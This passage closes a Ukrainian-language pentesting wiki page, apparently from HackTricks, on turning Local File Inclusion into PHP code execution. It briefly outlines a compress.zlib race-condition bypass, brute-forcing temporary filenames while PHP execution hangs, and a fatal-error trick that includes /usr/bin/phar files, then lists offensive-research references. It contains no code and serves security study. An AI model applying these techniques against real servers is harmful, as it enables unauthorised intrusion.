{{#endref}}

### Через compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Якщо ви знайшли **Local File Inclusion** і ви **can exfiltrate the path** тимчасового файлу, АЛЕ **сервер** **перевіряє**, чи **файл для включення має PHP-маркування**, ви можете спробувати **bypass that check** за допомогою цієї **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Через eternal waiting + bruteforce

Якщо ви можете зловживати LFI, щоб **завантажувати тимчасові файли** і змусити сервер **повісити** виконання PHP, ви потім можете **brute force filenames during hours**, щоб знайти тимчасовий файл:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### До Fatal Error

Якщо ви включите будь-який з файлів `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Потрібно включити той самий файл двічі, щоб викликати цю помилку).

**Я не знаю, наскільки це корисно, але можливо, що може бути.**\
_Навіть якщо ви спричините PHP Fatal Error, тимчасові PHP-файли, які були завантажені, видаляються._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Посилання

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
